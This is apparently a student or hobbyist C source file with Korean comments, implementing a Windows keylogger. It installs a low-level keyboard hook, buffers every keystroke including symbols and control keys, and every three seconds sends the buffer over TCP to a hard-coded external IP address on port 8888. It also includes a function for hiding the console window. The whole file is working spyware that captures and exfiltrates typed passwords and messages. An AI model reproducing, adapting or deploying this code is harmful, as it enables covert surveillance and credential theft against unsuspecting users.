#define WIN32_LEAN_AND_MEAN
#define UNICODE
//#define _WIN32_WINNT 0x0500

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <time.h>
#include <process.h>

// Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")

#define DEFAULT_BUFLEN 1024
#define DEFAULT_PORT "8888"

#define INVISIBLE
#define TIME_INTERVAL 3

static const struct {
    int key;
    const char* name;
} keyname[] = {
    {VK_BACK, "\b \b"},
    {VK_RETURN, "\n"},
    {VK_SPACE, " "},
    {VK_TAB, "[TAB]"},
    {VK_SHIFT, "[SHIFT]"},
    {VK_LSHIFT, "[SHIFT]"},
    {VK_RSHIFT, "[SHIFT]"},
    {VK_CONTROL, "[CTRL+"},
    {VK_LCONTROL, "[CTRL+"},
    {VK_RCONTROL, "[CTRL+"},
    {VK_MENU, "[ALT]"},
    {VK_LWIN, "[LWIN]"},
    {VK_RWIN, "[RWIN]"},
    {VK_ESCAPE, "[ESCAPE]"},
    {VK_CAPITAL, "[CAPSLOCK]"},
    {VK_END, "[END]"},
    {VK_HOME, "[HOME]"},
    {VK_LEFT, "[LEFT]"},
    {VK_RIGHT, "[RIGHT]"},
    {VK_UP, "[UP]"},
    {VK_DOWN, "[DOWN]"},
    {VK_PRIOR, "[PG_UP]"},
    {VK_NEXT, "[PG_DOWN]"}
};

HHOOK _hook;
KBDLLHOOKSTRUCT kbdStruct;

int thr = 1;
int ctrl = 0;
int shift = 0;

struct Node {
    char data;
    struct Node* next;
};
struct Node* head = NULL;

struct addrinfo* result = NULL,
    * ptr = NULL,
    hints;

void addList(char x) {
    struct Node* newNode = (struct Node*)malloc(sizeof(struct Node));
    newNode->data = x;
    newNode->next = NULL;
    if (head != NULL) {
        struct Node* tmp = head;

        while (tmp->next != NULL) {
            tmp = tmp->next;
        }
        tmp->next = newNode;
    }
    else {
        head = newNode;
    }
}

int list_get_head_key(struct Node* tmp, char* output) {
    int count = 0;

    while (tmp != NULL && count < DEFAULT_BUFLEN - 1) {
        output[count] = tmp->data;
        count++;
        tmp = tmp->next;
    }

    return count;
}

struct Node* list_pop_head(struct Node* st, int lim_check) {
    struct Node* tmp = NULL;

    while (st != NULL && lim_check > 0) {
        tmp = st;
        st = st->next;
        free(tmp);
        lim_check--;
    }
    return st;
}

LRESULT CALLBACK HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
    int i, x;
    int key_stroke, lowercase;
    HWND foreground;
    DWORD threadID;
    HKL layout = NULL;
    char window_title[256];
    char key;

    if (nCode >= 0)
    {
        kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);

        key_stroke = kbdStruct.vkCode;
        foreground = GetForegroundWindow();

        if (foreground) {
            // get keyboard layout of the thread
            threadID = GetWindowThreadProcessId(foreground, NULL);
            layout = GetKeyboardLayout(threadID);
        }

        if (foreground) {
            GetWindowTextA(foreground, (LPSTR)window_title, 256);
        }

        if (wParam == WM_KEYUP) {
            switch (key_stroke) {
            case VK_LCONTROL:
            case VK_RCONTROL:
                if (ctrl) {
                    addList(']');
                    ctrl = FALSE;
                }
                break;
            case VK_LSHIFT:
            case VK_RSHIFT:
            case VK_SHIFT:
                if (shift) {
                    shift = FALSE;
                }
                break;
            }
        }

        if (wParam == WM_KEYDOWN) {
            switch (key_stroke) {
            case VK_LCONTROL:
            case VK_RCONTROL:
                if (!ctrl) {
                    ctrl = TRUE;
                }
                break;
            case VK_LSHIFT:
            case VK_RSHIFT:
            case VK_SHIFT:
                if (!shift) {
                    shift = TRUE;
                }
                break;
            }

            if (ctrl && (key_stroke == 'Q')) {
                PostQuitMessage(0); // 메시지 루프에 종료 메시지를 보냄.
                thr = 0;
                return -1; // 후킹 체인에 메시지 전달안함.
            }

            for (i = 0; i < sizeof(keyname) / sizeof(keyname[0]); i++)
            {
                if (keyname[i].key == key_stroke)
                {
                    //add list
                    x = 0;
                    while (keyname[i].name[x] != 0) {
                        addList(keyname[i].name[x]);
                        x++;
                    }
                    break;
                }
            }

            if (i == sizeof(keyname) / sizeof(keyname[0]))
            {
                key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);

                if (shift && isdigit(key_stroke)) {
                    switch (key - 48) {
                    case 1:
                        key = '!';
                        break;
                    case 2:
                        key = '@';
                        break;
                    case 3:
                        key = '#';
                        break;
                    case 4:
                        key = '$';
                        break;
                    case 5:
                        key = '%';
                        break;
                    case 6:
                        key = '^';
                        break;
                    case 7:
                        key = '&';
                        break;
                    case 8:
                        key = '*';
                        break;
                    case 9:
                        key = '(';
                        break;
                    case 0:
                        key = ')';
                        break;
                    default: break;
                    }
                }
                else if (!isalpha(key_stroke) && shift)
                {
                    switch (key_stroke) {
                    case VK_OEM_PLUS:
                        key = '+';
                        break;
                    case VK_OEM_MINUS:
                        key = '_';
                        break;
                    case VK_OEM_PERIOD:
                        key = '>';
                        break;
                    case VK_OEM_2:
                        key = '?';
                        break;
                    case VK_OEM_COMMA:
                        key = '<';
                        break;
                    case VK_OEM_1:
                        key = ':';
                        break;
                    case VK_OEM_3:
                        key = '~';
                        break;
                    case VK_OEM_4:
                        key = '{';
                        break;
                    case VK_OEM_5:
                        key = '|';
                        break;
                    case VK_OEM_6:
                        key = '}';
                        break;
                    case VK_OEM_7:
                        key = '"';
                        break;
                    default:
                        break;
                    }
                }

                else {
                    lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

                    // check shift key
                    if (shift) {
                        lowercase = !lowercase;
                    }

                    if (!lowercase) {
                        key = tolower(key);
                    }
                }
                addList(key);
            }
        }
    }
    return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook() //후킹이 실패하였을 때 사용자에게 오류 메시지 표시함.
{

    if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
    {
        LPCWSTR a = L"Failed to install hook!";
        LPCWSTR b = L"Error";
        MessageBox(NULL, a, b, MB_ICONERROR);
    }
}

void ReleaseHook()
{
    UnhookWindowsHookEx(_hook);
}

// TCP 통신- connect, send, close
int SendtoServer(char* mes) {
    char recvbuf[DEFAULT_BUFLEN];
    int value;
    int recvbuflen = DEFAULT_BUFLEN;
    SOCKET ConnectSocket = INVALID_SOCKET;
    int lastError;

    ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
    if (ConnectSocket == INVALID_SOCKET) {
        printf("socket failed with error: %ld\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }

    value = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
    if (value == SOCKET_ERROR) {
        lastError = WSAGetLastError();
        printf("Connect failed with error: %d\n", lastError);
        return 1;
    }

    if (ConnectSocket == INVALID_SOCKET) {
        printf("Unable to connect to server!\n");
        WSACleanup();
        return 1;
    }
    else
        printf("Client::Successful Connection!\n");

    value = send(ConnectSocket, mes, (int)strlen(mes), 0);
    if (value == SOCKET_ERROR) {
        printf("send failed with error: %d\n", WSAGetLastError());
        return 1;
    }

    closesocket(ConnectSocket);
    return 0;
}

// send_data()
void TcpSend() {
    time_t startTime, currentTime;
    struct Node* tmp = NULL;
    int ret;
    int lim_check;

    char output[DEFAULT_BUFLEN];
    int outputIndex = 0;

    //버퍼 초기화
    memset(output, 0, DEFAULT_BUFLEN);

    //현재 시간 기록
    time(&startTime);

    printf("Every %d second, the input is output.\n", TIME_INTERVAL);

    // run every 3 seconds (excluding code run time)
    // thr = for ending program via key input
    while (thr) {
        time(&currentTime);

        // hit every 3 seconds
        if (difftime(currentTime, startTime) >= TIME_INTERVAL) {

            if (head != NULL && outputIndex == 0) {
                tmp = head;
                outputIndex = list_get_head_key(tmp, output);
                head = list_pop_head(head, outputIndex);
            }

            if (outputIndex != 0) {
                ret = SendtoServer(output);
                if (!ret) {
                    memset(output, 0, DEFAULT_BUFLEN);
                    outputIndex = 0;
                }
            }
            time(&startTime);
        }
    }
    return 0;
}

unsigned __stdcall Key() {
    SetHook();

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    ReleaseHook();
}

void Stealth()
{
#ifdef VISIBLE
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
#endif

#ifdef INVISIBLE
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
#endif
}

//int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, int nCmdShow)
int main() {
    //Stealth();

    WSADATA wsaData;
    int value;

    HANDLE keylogger = (HANDLE)_beginthreadex(NULL, 0, Key, NULL, 0, NULL);
    if (keylogger == 0) {
        printf("failed to make thread - keylogger\n");
        return 1;
    }

    // Winsock 초기화
    value = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (value != 0) {
        printf("WSAStartup failed with error: %d\n", value);
        return 1;
    }

    // addrinfo 구조체 초기화
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    value = getaddrinfo("182.210.200.238", DEFAULT_PORT, &hints, &result);
    if (value != 0) {
        printf("getaddrinfo failed with error: %d\n", value);
        WSACleanup();
        return 1;
    }

    ptr = result;

    TcpSend();

    printf("\nConnection End.\n");
    freeaddrinfo(result); //주소 정보 해제.

    // cleanup
    WSACleanup();
    CloseHandle((HANDLE)keylogger);

    return 0;
}
